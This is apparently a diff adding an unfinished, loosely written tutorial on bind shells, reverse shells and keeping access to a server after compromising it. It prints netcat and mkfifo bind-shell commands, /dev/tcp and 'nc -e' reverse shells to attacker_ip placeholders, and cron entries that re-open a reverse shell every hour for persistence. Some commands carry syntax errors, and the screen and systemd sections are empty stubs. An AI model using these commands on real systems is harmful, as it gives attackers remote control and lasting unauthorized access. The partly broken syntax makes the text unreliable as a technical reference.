@@ -1,0 +1,120 @@
+hello  guys i'm amirreza nobahar and in thies jurney we gonna learn about my expreance about bind shell reverse shell and Maintain access after gain access from sever after hack 
+
+then i gonna describe some existen tools in linux about some things like tmux , screen , cron ...
+
+
+let's gooo
+
+what's shell
+
+the command line environment which we can run command like ls pwd whoami and ...
+
+bind shell
+
+in bind shell target listining and attacker connect this.in other word target is server and attacker is client .
+
+for listening in target system attacker can run some commands for get interactive shell :
+
+use netcat :
+
+nc -nlvp 4444 -e /bin/bash
+
+this command listen on port 4444 and after connect give one bash
+
+use bash:
+
+bash can not listen himself but we can use ways for listening like:
+
+use fifo : 
+
+fifo is named pipe which give we input in ouput
+
+for make fifo we use :mkfifo
+
+rm /tmp/fifo ; mkfifo /tmp/fifo
+
+cat /tmp/fifo | /bin/bash -i 2>&1 |nc -nlvp 4444 > /tmp/fifo
+
+this command same loop and cat read fifo and give this for bash and 2>&1 return error ouput in where ouput going . and nc listen on port 4444 and give what given for fifo
+
+
+reverse shell :
+
+in reverse shell attacker listening and target connect to attacker .in other word target is client and attacker is server .
+
+for connect target to attacker we have some commands like:
+
+use /dev/tcp:
+
+bash -i &> | /dev/tcp/ip/port 0>&1
+
+bash -i give interactive shell and /dev/tcp connect to ip and port 
+&>  give input and ouput for /dev/tcp/ip/port  and 2>&1 send input where ouput going .
+
+use netcat:
+
+nc ip port < /bin/bash 
+
+or 
+
+nc -e /bin/bash attacker ip attacker port 
+
+
+
+Everlasting connection :
+
+use cron:
+
+cron have one tab which we can write command in and execute repeteadly 
+
+for edit crontab :
+
+crontab -e .
+
+ * * * * * command 
+
+1*:minute 
+2*:hour
+3*:day
+4*:month
+5*:week day 
+
+example :
+
+6 15 * * * echo helllllo > oup.txt
+
+every 15:6 oclock do this command 
+
+we cand use this for command for Always Connected:
+
+15 * * * * /bin/bash -i &> | /dev/tcp/attacker_ip/attacker_port 0>&1
+15 * * * * nc -e /bin/bash attacker_ip attacker_port
+
+
+use tmux:
+
+tmux create one session in backgroun and work always 
+
+create tmux tab:
+tmux new -t tab-name
+
+go to tab :
+tmux attack -t tab_name
+
+show tabs(sessions) :
+tmux ls
+
+and we can write command in sessions for run always 
+
+
+use screen:
+
+screen like tmux create session in backgroun and run always
+
+create screen:
+
+compleate this 
+
+
+use systemd service :
+compleate this
